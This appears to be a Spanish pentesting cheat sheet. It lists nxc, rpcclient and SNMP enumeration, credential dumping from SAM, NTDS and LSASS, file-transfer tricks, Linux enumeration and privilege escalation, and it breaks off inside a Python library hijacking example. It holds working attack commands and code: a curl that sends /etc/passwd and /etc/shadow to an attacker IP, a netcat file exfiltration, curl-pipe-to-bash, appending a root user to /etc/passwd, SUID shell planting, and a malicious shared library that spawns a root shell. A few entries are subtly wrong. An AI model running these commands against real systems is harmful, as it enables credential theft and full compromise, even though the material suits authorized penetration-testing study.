nxc smb <target> -u <user> -p <password> --disks

# enumera las computadoras en el dominio
nxc smb <target> -u <user> -p <password> --computers

# enumera los usuarios logueados
nxc smb <target> -u <user> -p <password> --loggedon-users

# enumera usuarios del dominio
nxc smb <target> -u <user> -p <password> --users

# enumera grupos del dominio
nxc smb <target> -u <user> -p <password> --groups

# enumera los grupos locales de la máquina
nxc smb <target> -u <user> -p <password> --local-group

# enumera usuarios por fuerza bruta de RID. Por defecto el valor de RID máximo es 4000.
nxc smb <target> -u <user> -p <password> --rid-brute [MAX-RID]

# enumera la politica de contraseña
nxc smb <target> -u <user> -p <password> --pass-pol

# emite la consulta WMI especificada
nxc smb <target> -u <user> -p <password> --wmi

# WMI Namescape (default: root\cimv2)
nxc smb <target> -u <user> -p <password> --wmi-namespace

# Recupera la contraseña en texto claro y otra información de las cuentas distribuidas mediante las Group Policy Preferences (GPP).
nxc smb <target> -u <user> -p <password> -M gpp_password

# Busca en el controlador de dominio el archivo registry.xml para encontrar información de auto-login y devuelve el nombre de usuario y la contraseña.
nxc smb <target> -u <user> -p <password> -M gpp_autologin

# Buscar un patrón en un recurso compartido remoto.
nxc smb <target> -u <user> -p <password> --spider <share_name> --pattern <pattern>

# Buscar en un recurso compartido remoto usando expresiones regulares.
nxc smb <target> -u <user> -p <password> --spider <share_name> --regex <regex>

# Habilita la búsqueda de contenido. Puede combinarse con --pattern o --regex.
nxc smb <target> -u <user> -p <password> --spider <share_name> --content

# Obtener un archivo remoto desde una carpeta compartida.
nxc smb <target> -u <user> -p <password> --share <share_name> --get-file <remote_filename> <output_filename>

# Subir un archivo local a una ubicación remota.
nxc smb <target> -u <user> -p <password> --share <share_name> --put-file <local_filename> <remote_filename>

# Crea un archivo que contiene la información de los recursos compartidos y los archivos. Podemos añadir la opción EXCLUDE_DIR para evitar que busque dentro de carpetas compartidas específicas.
nxc smb <target> -u <user> -p <password> -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL

# Descargar todos los archivos de todas las carpetas compartidas.
nxc smb <target> -u <user> -p <password> -M spider_plus -o READ_ONLY=false

# Ejecutar comandos CMD en el objetivo.
nxc smb <target> -u <user> -p <password> -x <command>

# Ejecutar comandos PowerShell en el objetivo.
nxc smb <target> -u <user> -p <password> -x <command>

# Volcar el SAM en el objetivo.
nxc smb <target> -u <user> -p <password> --sam

# Volcar el LSA en el objetivo.
nxc smb <target> -u <user> -p <password> --sam

# Volcar el NTDS.dit en el controlador de dominio usando el método drsuapi.
nxc smb <target> -u <user> -p <password> --ntds

# Volcar el NTDS.dit en el controlador de dominio usando el método VSS.
nxc smb <target> -u <user> -p <password> --ntds vss

# Volcar la memoria del procesos LSASS con lsassy
nxc smb <target> -u <user> -p <password> -M lsassy

# Volcar la memoria del procesos LSASS con procdump
nxc smb <target> -u <user> -p <password> -M procdump

# Volcar la memoria del procesos LSASS con handlekatz
nxc smb <target> -u <user> -p <password> -M handlekatz

# Volcar la memoria del procesos LSASS con nanodump
nxc smb <target> -u <user> -p <password> -M nanodump

# Comprobar si el DC es vulnerable a Zerologon (CVE-2020-1472)
nxc smb <target> -u <user> -p <password> -M Zerologon

# Comprobar si el DC es vulnerable a PetitPotam
nxc smb <target> -u <user> -p <password> -M PetitPotam

# Comprobar si el objetivo es vulnerable a MS17-010
nxc smb <target> -u <user> -p <password> -M ms17-010

# Verifica si el DC (Controlador de Dominio) es vulnerable a CVE-2021-42278 y CVE-2021-42287 para suplantar a DA (Administrador de Dominio) desde un usuario estándar del dominio.
nxc smb <target> -u <user> -p <password> -M nopac

# Verificar si el DC es vulnerable a DFSCocerc
nxc smb <target> -u <user> -p <password> -M dfscoerce

# Verificar si el objetivo es vulnerable a ShadowCoerce.
nxc smb <target> -u <user> -p <password> -M shadowcoerce
```

Rpcclient es una utilidad que forma parte del conjunto de herramientas Samba. Se utiliza para interactuar con el protocolo Remote Procedure Call (RPC) de Microsoft, que se utiliza para la comunicación entre los sistemas basados en Windows y otros dispositivos. rpcclient se utiliza principalmente para fines de depuración y pruebas, y se puede utilizar para consultar y manipular sistemas remotos.

El protocolo SMB se utiliza principalmente para compartir archivos, impresoras y otros recursos en una red, pero también puede aprovechar RPC para ciertas funcionalidades y operaciones específicas.

Por ejemplo, cuando accedes a recursos compartidos en una red Windows, como carpetas compartidas o impresoras, estás utilizando el protocolo SMB. Sin embargo, para algunas operaciones administrativas y de gestión, como enumerar usuarios y grupos, modificar permisos de archivos o impresoras, o acceder a la configuración del sistema remoto, SMB puede utilizar RPC para realizar estas tareas.

Cuando utilizas herramientas como `rpcclient` para interactuar con un sistema remoto que ejecuta servicios SMB, estás esencialmente aprovechando el protocolo RPC subyacente que forma parte de la implementación de SMB en ese sistema. De esta manera, `rpcclient` puede actuar como una interfaz para realizar consultas y ejecutar comandos a través del protocolo RPC en el contexto de un servidor SMB.

```bash
# obtener información sobre el sistema remoto, como el nombre del servidor, 
# la versión del sistema operativo, el dominio de trabajo, la fecha y la hora del sistema, entre otros datos.
rpcclient -U "" -N <RHOST> -c "srvinfo"

# enumera los usuarios del dominio
rpcclient -U "" -N <RHOST> -c "enumdomusers"

# enumera los grupos del dominio
rpcclient -U "" -N <RHOST> -c "enumdomgroups"

# obtiene el SID del usuario en base a su nombre
rpcclient -U "" -N <RHOST> -c "lookupnames root"

# Se utiliza para enumerar los SID (Security Identifiers) asignados a los grupos 
# en un servidor remoto. Es útil para obtener información sobre los grupos de 
# seguridad disponibles en un sistema y sus respectivos SID.
rpcclient -U "" -N <RHOST> -c "lsaenumsid"

# Buscar posible información en la descripción del usuario
for user in $(cat ad_users.txt); do rpcclient -U '' -N megabank.local -c "queryuser $user"; done | grep -E "User Name|Description"
```

El parámetro `-c` en `rpcclient` se utiliza para especificar un comando o una secuencia de comandos que se ejecutarán en el servidor remoto una vez que se haya establecido la conexión. Esto permite realizar operaciones específicas de forma automática sin necesidad de interactuar manualmente con `rpcclient` después de establecer la conexión.

La sintaxis básica del parámetro `-c` es la siguiente:

```bash
rpcclient -U username //<RHOST> -c "command1; command2; command3"
```

#### RID Cycling Attack

```bash
seq 1 5000 | xargs -P 50 -I{} rpcclient -U "" 30.30.30.4 -N -c "lookupsids S-1-22-1-{}" 2>&1
```

#### SMB desde Windows

```powershell
# listar recursos compartidos
net share

# borrar el recurso compartido
net use * \delete

# montar el recurso compartido
net use z: \\<RHOST>\c$ <password> /user:<username>

# /all nos permite ver los recursos compartidos administrativos (que terminan en '$').
# Puede usar IP o nombre de host para especificar el host.
net view \\<RHOST> /all
```

Recursos compartidos comunes en Windows:

- `C$` corresponde a C:/
- `ADMIN$` se asigna a C:/Windows
- `IPC$` se utiliza para RPC
- `Print$` aloja controladores para impresoras compartidas
- `SYSVOL` sólo en DCs
- `NETLOGON` sólo en los DC

#### Interactuar con el cliente SMB

```bash
smb: \> help # muestra la ayuda
smb: \> ls # listar archivos
smb: \> put file.txt # subir un archivo
smb: \> get file.txt # descargar un archivo
```

#### Montar una recurso compartido

```bash
mount -t cifs -o "username=user,password=password" //<RHOST>/share /mnt/share
```

#### Fuerza bruta de credenciales

```bash
nmap --script smb-brute -p 445 <RHOST>
hydra -l admin -P /usr/share/wordlist/rockyou.txt <RHOST> smb
```

### SNMP (161 - UDP)

El Protocolo Simple de Administración de Red, o SNMP por sus siglas en inglés, es un protocolo basado en UDP que, inicialmente, fue implementado de manera no muy segura. Cuenta con una base de datos (MIB) que almacena información relacionada con la red. El puerto predeterminado de SNMP es el 161 UDP. Hasta la tercera versión de este protocolo, SNMPv3, la seguridad de SNMP era deficiente. Existen diversas herramientas para interactuar con SNMP, ya que este protocolo puede proporcionarnos mucha información acerca de una organización, basándose en las respuestas del servidor. Algunas herramientas útiles incluyen _onesixtyone_ para realizar ataques de fuerza bruta básicos y enumeración, y _snmpwalk_ para acceder a los datos de la base de datos MIB.

La "cadena de comunidad SNMP" funciona como un ID de usuario o una contraseña que permite acceder a las estadísticas de un enrutador u otro dispositivo. Las cadenas de comunidad SNMP solo se utilizan en dispositivos que soportan los protocolos SNMPv1 y SNMPv2c. Por su parte, SNMPv3 utiliza autenticación mediante nombre de usuario/contraseña, junto con una clave de cifrado. De manera convencional, la mayoría de los dispositivos SNMPv1 y SNMPv2c que se envían de fábrica tienen la cadena de comunidad de solo lectura configurada como "public". Es una práctica estándar que los administradores de red cambien todas las cadenas de comunidad a valores personalizados durante la configuración del dispositivo.

```bash
sudo apt-get install snmp-mibs-downloader
```

```bash
snmpwalk -c public -v1 <RHOST>
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.4.34.1.3
snmpwalk -v2c -c public <RHOST> .1
snmpwalk -v2c -c public <RHOST> nsExtendObjects
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 <RHOST> .1.3.6.1.2.1.1.5
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.3.1.1
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.27
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.6.13.1.3
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.6.3.1.2
snmpwalk -v2c -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

|MIB|Microsoft Windows SNMP parámetros|
|---|---|
|1.3.6.1.2.1.25.1.6.0|Procesos|
|1.3.6.1.2.1.25.4.2.1.2|Programas en ejecución|
|1.3.6.1.2.1.25.4.2.1.4|Rutas de los procesos|
|1.3.6.1.2.1.25.2.3.1.4|Unidades de almacenamiento|
|1.3.6.1.2.1.25.6.3.1.2|Software|
|1.3.6.1.4.1.77.1.2.25|Cuentas de usuarios|
|1.3.6.1.2.1.6.13.1.3|Puertos TCP locales|

> Referencias: [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html)

### SSH(22)

SSH (Secure Shell) es un protocolo de red que permite conectarse de forma segura a otros dispositivos a través de una red insegura, como Internet. Sirve principalmente para administrar servidores de manera remota mediante una consola cifrada.

Todo el tráfico de SSH viaja encriptado, incluyendo credenciales y comandos. Esto protege la información frente a ataques de intercepción. Funciona típicamente sobre el puerto TCP 22 y soporta autenticación por contraseña o mediante claves públicas.

Además de sesiones interactivas, SSH permite transferir archivos (con scp o sftp) y crear túneles seguros para redirigir tráfico de red.

```bash
ssh <user>@<target>
ssh <user>@<target> -P <port>
ssh -i <rsa_file> <user>@<target>
```

```bash
# Autenticarse contra un servidor SSH usando usuario y contraseña
nxc ssh <target> -u <user> -p <password>

# Forzar un puerto específico para la conexión SSH (por ejemplo, si no es el 22)
nxc ssh <target> -u <user> -p <password> --port <PORT>

# Descargar un archivo específico desde el servidor SSH
nxc ssh <target> -u <user> -p <password> --get-file <REMOTE_FILE_PATH> <LOCAL_FILE_PATH>

# Subir un archivo local al servidor SSH
nxc ssh <target> -u <user> -p <password> --put-file <LOCAL_FILE_PATH> <REMOTE_PATH>

# Ejecutar un comando específico remotamente en el servidor SSH
nxc ssh <target> -u <user> -p <password> --x '<comando>'
```

### Finger (79)

El puerto 79 se utiliza principalmente para el protocolo Finger. Este protocolo permite a los usuarios obtener información sobre otros usuarios en un sistema remoto. El cliente abre una conexión TCP al puerto 79 del servidor, donde se ejecuta un demonio Finger que procesa la solicitud. 

El protocolo Finger es un protocolo simple que devuelve información sobre un usuario, como su nombre completo, información de contacto, último inicio de sesión, etc. Es menos común en la actualidad, pero todavía se utiliza en algunos sistemas y redes.

Utilizamos [este](https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/refs/heads/master/finger-user-enum.pl) script de Perl para enumerar usuarios 

```c
./finger-user-enum.pl -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t 192.168.162.140 | grep -v 'is not known'
```

Referencias: [Finger](https://www.verylazytech.com/network-pentesting/finger-port-79)

## Linux

### Transferencia de archivos

Diferentes utilidades para las operaciones de transferencia de archivos en Linux.

#### Operaciones de Descarga

##### Codificación/Decodificación Base64

###### Máquina atacante

```bash
cat test.txt | base64 -w 0; echo
SGVsbG8gV29ybGQhCg==
```
###### Máquina víctima

```bash
echo "SGVsbG8gV29ybGQhCg==" | base64 -d > test.txt
```

##### Descargas web con Wget y cURL

Dos de las utilidades más comunes en las distribuciones de Linux para interactuar con aplicaciones web son wget y curl. Estas herramientas están instaladas en muchas distribuciones de Linux.

Para descargar un archivo usando wget, necesitamos especificar la URL y la opción -O para establecer el nombre del archivo de salida.

###### Descargar un archivo usando wget

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

###### Descargar un archivo usando cURL

cURL es muy similar a wget, pero la opción del nombre del archivo de salida es -o en minúscula.

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o /tmp/LinEnum.sh
```

##### Descarga sin archivos con cURL

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

#### Descargar con Bash (/dev/tcp)

También puede haber situaciones en las que ninguna de las herramientas de transferencia de archivos más conocidas esté disponible. Siempre que esté instalada la versión `2.04` o superior de Bash (compilada con `--enable-net-redirections`), el archivo de dispositivo integrado /dev/tcp se puede utilizar para descargas de archivos simples.

##### Máquina atacante

Creamos un servidor HTTP con Python.

```bash
python3 -m http.server 80
```

##### Máquina víctima

Nos conectamos al servidor web de destino

```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

Realizamos la solicitud HTTP GET

```bash
echo -e "GET /test.txt HTTP/1.1\n\n">&3
```

Imprimimos la respuesta

```bash
cat <&3
```

#### Descargas SSH

```bash
scp elliot@192.168.1.19:/root/myroot.txt . 
```

#### Web Upload

Podemos usar uploadserver , un módulo extendido de Python HTTP.Server módulo, que incluye una página de carga de archivos. Para este ejemplo de Linux, veamos cómo podemos configurar el `uploadserver` módulo a utilizar HTTPS para una comunicación segura.

Lo primero que debemos hacer es instalar el uploadserver módulo.

##### Iniciar servidor web

```bash
sudo python3 -m pip install --user uploadserver
```

Ahora necesitamos crear un certificado. En este ejemplo, utilizamos un certificado autofirmado.

Crear un certificado autofirmado

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

El servidor web no debe alojar el certificado. Recomendamos crear un nuevo directorio para alojar el archivo en nuestro servidor web.

##### Iniciar servidor web

```bash
mkdir https && cd https

sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Ahora desde nuestra máquina comprometida, carguemos el /etc/passwd y /etc/shadow archivos.

##### Máquina Víctima (Linux)

```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

Usamos la opción `--insecure` porque utilizamos un certificado autofirmado en el que confiamos.

#### Netcat
##### Máquina atacante

```bash
nc -l -p 4444 > output.txt
```

##### Máquina victima

```bash
nc -w 3 192.168.1.10 4444 < output.txt
```
#### Método alternativo de transferencia de archivos web

##### Creación de un servidor web con Python3

```bash
python3 -m http.server
```

##### Creación de un servidor web con Python2.7

```bash
python2.7 -m SimpleHTTPServer
```

##### Creación de un servidor web con PHP

```bash
php -S 0.0.0.0:8000
```

##### Creación de un servidor web con Ruby

```bash
ruby -run -ehttpd . -p8000
```

##### Descargamos el archivo

```bash
wget 192.168.1.19:8000/filetotransfer.txt
```
#### Operaciones de Subida
##### SCP

```bash
scp /etc/passwd student@10.10.14.30:/home/student/
```

### Enumeración

#### Sistema

```bash
hostname
hostname -I
uname -a
w
lastlog
cat /etc/issue
cat /etc/os-release
cat /proc/version
cat /etc/shells
sudo -V
ps aux
df -h
mount
cat /etc/fstab
cat /etc/fstab | grep -v "#" | column -t
lscpu
lsblk
lsmod
/sbin/modinfo libata
```

#### Red

```bash
ip a
ifconfig
route
arp -a
ip route
ip neigh
ss -anp
netstat -net
netstat -ano
cat /etc/hosts
cat /etc/iptables/rules.v4
```

#### Usuarios y Grupos

```bash
whoami
id
env
history
cat .bashrc
cat /etc/passwd
cat /etc/passwd | grep "sh$"
grep "sh$" /etc/passwd | awk '{print $1}' FS=":"
cat /etc/shadow
cat /etc/group
getent group sudo
sudo -l
```

#### Algoritmos más utilizados

| Algoritmo  | Hash         |
| ---------- | ------------ |
| Salted MD5 | $1$...       |
| SHA-256    | $5$...       |
| SHA-512    | $6$...       |
| BCrypt     | $2a$...      |
| Scrypt     | $7$...       |
| Argon2     | $argon2i$... |

#### Tareas cron

```bash
crontab -l
sudo crontab -l
cat /var/log/syslog
ls -lah /etc/cron*
```

#### Capabilities

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

#### Archivos y Directorios

```bash
ls -l /tmp /var/tmp /dev/shm
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep student
find / -type d -name ".*" -ls 2>/dev/null
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

#### Búsqueda de credenciales

```bash
locate password | more
find / type f -name wp-config.php -exec grep -E "DB_PASSWORD|DB_USER|DB_NAME" {} \; 2>/dev/null
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
find / -name password 2>/dev/null -exec ls -l {} \; 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null
grep -rnw '/' -ie "PASSWORD" –color=always 2>/dev/null
find /home/* -type f -name "*.txt" -o ! -name "*.*"
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

#### Binarios y Paquetes instalados

```bash
dpkg -l
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
ls -l /bin /usr/bin/ /usr/sbin/
```

#### Procesos y Servicios

```bash
strace
ps aux | grep root
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
```

#### Búsqueda de claves SSH

```bash
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
```

#### Archivos con permisos de escritura

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'> /home/user/.backups/script.sh
```

Si por alguna razón podemos escribir en el archivo `/etc/passwd`, generamos el hash correspondiente y agregamos una línea a `/etc/passwd` usando el formato apropiado:

```bash
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su - 
```

#### Automatización

- [Linpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20230108)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

### Restricted Shell

```bash
ssh user@10.0.0.3 -t "/bin/sh"
ssh user@10.0.0.3 -t "bash --noprofile"
ssh user@10.0.0.3 -t "(){:;}; /bin/bash"

# Vim
:set shell=/bin/bash
:shell

# more, less, man, ftp, gdb
'! /bin/sh'
'!/bin/sh'
'!bash'

# AWK
awk 'BEGIN {system("/bin/sh")}'

# Find
find / -name offsec -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

# Python
exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()

# Perl
exec "/bin/sh";

# Ruby
exec "/bin/sh"

# Lua
os.execute('/bin/sh')
```

### Escalación de privilegios

#### Tares Cron
Los trabajos Cron son tareas programadas en sistemas Unix/Linux que se ejecutan automáticamente en intervalos específicos. Sin embargo, si no están configurados correctamente, pueden convertirse en un vector de ataque para escalar privilegios o ejecutar código malicioso. A continuación, se describen técnicas comunes para explotar vulnerabilidades en trabajos Cron:

![Cron](/images/cron.png)

Comandos ejecutados por otros usuarios, incluyendo tareas cron. Funciona escaneando el sistema de archivos `procfs`. Para usar pspy, podemos ejecutar el siguiente comando:

```bash
./pspy
``` 

**Identificación de tareas Cron**

Para ver trabajos cron específicos del usuario, podemos utilizar el comando:

```bash
crontab -l
```

Para ver los trabajos cron de todo el sistema, podemos verificar los archivos en `/etc/crontab`, `/etc/cron.d/`, y `/var/spool/cron/crontabs/`.

**Técnicas de explotación de trabajos Cron**

| Técnica                                  | Descripción                                                                                                                                                                         |
| ---------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Modificación de scripts**              | Si un script ejecutado por Cron tiene permisos de escritura globales, un atacante puede modificarlo para ejecutar comandos arbitrarios.                                             |
| **Creación de scripts maliciosos**       | Si Cron ejecuta un script específico, un atacante puede crear un script con el mismo nombre y colocarlo en un directorio que tenga prioridad en el `PATH`.                          |
| **Condiciones de carrera**               | Un atacante puede reemplazar rápidamente un script mientras Cron lo está ejecutando, aprovechando ventanas de tiempo críticas.                                                      |
| **Manipulación de variables de entorno** | Si Cron depende de variables de entorno no configuradas o no depuradas, un atacante puede manipularlas para alterar el comportamiento del comando ejecutado.                        |
| **Manipulación de rutas (PATH)**         | Si Cron usa comandos sin rutas absolutas, un atacante puede modificar la variable `PATH` para ejecutar versiones maliciosas de esos comandos.                                       |
| **Ataques de enlace simbólico**          | Si Cron escribe la salida en un archivo, un atacante puede crear un enlace simbólico desde ese archivo a un archivo confidencial o a un script controlado por él.                   |
| **Uso de características del shell**     | Si Cron usa un shell como `bash`, un atacante puede explotar características como la sustitución de comandos para ejecutar código arbitrario.                                       |
| **Inserción en el Crontab**              | Si un usuario con privilegios permite que otros agreguen entradas al Crontab (por ejemplo, con `crontab -e`), un atacante puede insertar comandos maliciosos.                       |
| **Permisos de usuario insuficientes**    | Si Cron se ejecuta con privilegios elevados y no restringe adecuadamente los scripts o binarios que ejecuta, un atacante puede modificar o crear archivos para escalar privilegios. |
| **Manipulación de la salida**            | Si la salida de Cron se guarda en un archivo con permisos de escritura globales, un atacante puede manipular o reemplazar este archivo para ejecutar código arbitrario.             |
| **Ataques de sincronización**            | Conociendo el momento exacto en que se ejecuta un trabajo Cron, un atacante puede lanzar ataques sincronizados, como la manipulación de scripts justo antes de su ejecución.        |
| **Inclusión de archivos locales (LFI)**  | Si Cron incluye archivos sin validar adecuadamente la entrada, un atacante puede aprovechar esto para incluir archivos maliciosos que se ejecuten durante la tarea programada.      |


#### SUID
**Set User ID (SUID)** es un permiso especial en sistemas Unix/Linux. Cuando un archivo tiene el bit SUID establecido, permite que se ejecute con los privilegios de su propietario, independientemente del usuario que lo ejecute. Se suele utilizar para otorgar a usuarios normales permisos elevados temporales para ejecutar tareas específicas.

![SUID](/images/suid.png)

Indicado por `rws` para el permiso del propietario. Cuando el bit SUID (Set User ID) está activado (representado por una `s` en lugar de una `x` en el permiso de ejecución), cualquier usuario que ejecute este archivo lo hará con los permisos del propietario del archivo. Esto se utiliza comúnmente cuando un archivo es propiedad de root, pero permite que usuarios regulares lo ejecuten con privilegios de superusuario.

Los siguientes tres caracteres (`rws`) representan los permisos para el grupo propietario del archivo. Al igual que con los permisos del propietario, se otorgan o deniegan los permisos de lectura (`r`), escritura (`w`) y ejecución (`x`) para el grupo. Cuando el bit GUID (Set Group ID) está activado, el bit de ejecución (`x`) para el grupo se reemplaza por una `s`, lo que indica que el archivo se ejecutará con los privilegios del grupo propietario.

El GUID es similar al SUID, pero se aplica al grupo. Permite que cualquier usuario que ejecute el archivo lo haga con los permisos del grupo propietario. En este ejemplo, el permiso del grupo incluye una `s`, lo que muestra que el bit GUID está activado.

##### Cómo identificar archivos SUID 

Los archivos SUID se pueden identificar buscando archivos con el bit `s` en el campo de permiso de ejecución del propietario. 

```bash
find / -perm -4000 2>/dev/null
```

Ejemplo:

```bash
-rwsr-xr-x 1 root root /usr/bin/passwd
```

En este ejemplo:

- `rws`: Indica que el bit SUID está establecido.
- El propietario es `root`, lo que significa que cualquier usuario que ejecute este archivo lo hace con privilegios de `root`.

##### Cómo explotar binarios SUID para escalar privilegios. 

Algunos binarios esenciales en sistemas Linux, como su, sudo y passwd, suelen tener el bit SUID activado por defecto. Estos binarios son fundamentales para el funcionamiento del sistema y, en general, se consideran seguros. Sin embargo, el riesgo de vulnerabilidades aumenta cuando se trata de binarios de terceros o menos comunes. Para identificar posibles métodos de explotación, una excelente primera aproximación es consultar [GTFOBins](https://gtfobins.github.io/), un recurso invaluable que recopila técnicas para aprovechar binarios con permisos especiales, como **SUID**.

[GTFOBins SUID](https://gtfobins.github.io/#+suid)

Por ejemplo, si el bit SUID está habilitado en un binario como Python, es posible explotarlo para escalar privilegios en el sistema. A continuación, se describe un caso práctico:

**Verificar si Python tiene el bit SUID activado**

Para comprobar si Python tiene el bit SUID configurado, ejecuta el siguiente comando:

```bash
ls -l /usr/bin/python
```

Si el bit SUID está activado, verás una salida similar a esta:

```bash
-rwsr-xr-x 1 root root /usr/bin/python
```

La `s` en los permisos del propietario (rws) indica que el bit SUID está habilitado.

**Explotar Python para escalar privilegios**

Si Python tiene el bit SUID activado, podemos ejecutar una línea de código para obtener una shell con privilegios de root:

```bash
/usr/bin/python -c 'import os; os.execl("/bin/bash", "bash", "-i")'
```

Este comando utiliza Python para lanzar una shell interactiva (`/bin/bash`) con los permisos del propietario del archivo, en este caso, `root`.

#### SUDO

Los privilegios de sudo pueden ser asignados a una cuenta, permitiendo que dicha cuenta ejecute comandos específicos en el contexto de root (u otro usuario) sin necesidad de cambiar de usuario o otorgar privilegios excesivos. Cuando se ejecuta el comando sudo, el sistema verifica si el usuario que lo ejecuta tiene los permisos adecuados, según la configuración definida en el archivo /etc/sudoers.

Al acceder a un sistema, siempre es recomendable verificar si el usuario actual tiene privilegios de sudo. Esto se puede hacer ejecutando el comando:

```bash
sudo -l
```

Este comando lista los comandos que el usuario puede ejecutar con sudo. En algunos casos, es posible que se requiera la contraseña del usuario para mostrar esta información. Sin embargo, si hay entradas en la configuración de sudo que incluyen la opción NOPASSWD, estos permisos se mostrarán sin necesidad de ingresar una contraseña.

**Ejemplo `tar`:**

![tar](/images/sudo.png)

Referencias: [GTFOBins SUDO](https://gtfobins.github.io/#+sudo)

#### Shared Object

Un `shared object` (objeto compartido) es un archivo binario compilado que contiene código y datos reutilizables por múltiples programas. En sistemas **Unix-like** (como Linux), estos archivos tienen la extensión **.so** y permiten:

- **Reducir redundancia**: Varios programas pueden cargar la misma biblioteca en memoria.
- **Ahorrar recursos**: Evita duplicar código en cada ejecutable.

##### Explotación mediante Manipulación de Bibliotecas

Algunos binarios utilizan bibliotecas personalizadas (no estándar). Si tenemos acceso de escritura sobre estas, podemos escalar privilegios.

Ejemplo Práctico

**1. Identificar un binario con SUID (ejecución como propietario, normalmente root)**:

```bash
elliot@debian:~$ ls -la custom_binary
-rwsr-xr-x 1 root root 16728 Jan 12 11:05 custom_binary
```

**2. Verificar las bibliotecas que usa el binario (comando `ldd`)**:

```bash
elliot@debian:~$ ldd custom_binary
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f0c13112000)
```

Se observa que usa una biblioteca no estándar: `libshared.so`

**3. Ubicar la ruta de carga de bibliotecas (comando `readelf`)**:

```bash
elliot@debian:~$ readelf -d custom_binary | grep PATH
0x00000000000000 (RUNPATH)  Library runpath: [/development]
```

El binario carga la bibliotecas desde `/development`.

**4. Explotación (si tenemos escritura en `/development`)**

Creamos una biblioteca maliciosa (`libshared.c`):

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    setuid(0);
    system("/bin/sh -p");
}
```

Compilamos y reemplazamos la biblioteca original:

```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```

Ejecutamos el binario `custom_binary`

```bash
elliot@debian:~$ ./custom_binary
# id
uid=0(root) gid=1000(elliot) groups=1000(elliot)
```

#### Python Library Hijacking

El **Python Library Hijacking** es una vulnerabilidad de seguridad que permite a un atacante ejecutar código arbitrario manipulando el entorno de Python para cargar una biblioteca maliciosa en lugar de la legítima. Esto puede llevar a:

- **Escalada de privilegios** (si el script se ejecuta como root).
- **Ejecución remota de comandos (RCE)** en aplicaciones críticas.

##### ¿Cómo funciona?

**1. Carga Dinámica de Módulos**

Python busca los módulos importados en este orden:

- **Directorio del script actual**.
- **Directorios en `PYTHONPATH` (variable de entorno)**.
- **Bibliotecas estándar (`/usr/lib/pythonX.X`)**.
- `site-packages` (paquetes instalados con `pip`).

**2. Explotación por Prioridad de Rutas**

Si un script con SUID (ejecución como root) importa un módulo y:

- Tenemos permisos de escritura en una ruta prioritaria (ej: `/usr/lib/python3.11`).

- **Creamos un archivo malicioso** con el mismo nombre que el módulo legítimo (ej: `requests.py`). Python cargará **nuestro código malicioso** en lugar del módulo original.

##### Caso 1: Módulo con Permisos de Escritura

**1. Identificar un script Python con SUID**:

```bash
ls -l /usr/bin/script.py
-rwsr-xr-x 1 root root 1000 Jan 10 11:00 /usr/bin/script.py
```

**2. Verificar qué módulos importa**:

```bash
cat /usr/bin/script.py
import requests  # Módulo objetivo
```

**3. Ubicar la ruta legítima del módulo**:

```bash
pip3 show requests
Location: /usr/local/lib/python3.11/dist-packages
```

**4. Explotación si tenemos escritura en /usr/lib/python3.11**:

Crear un archivo malicioso `requests.py`:

```bash
import os
os.setuid(0)  # Obtener root
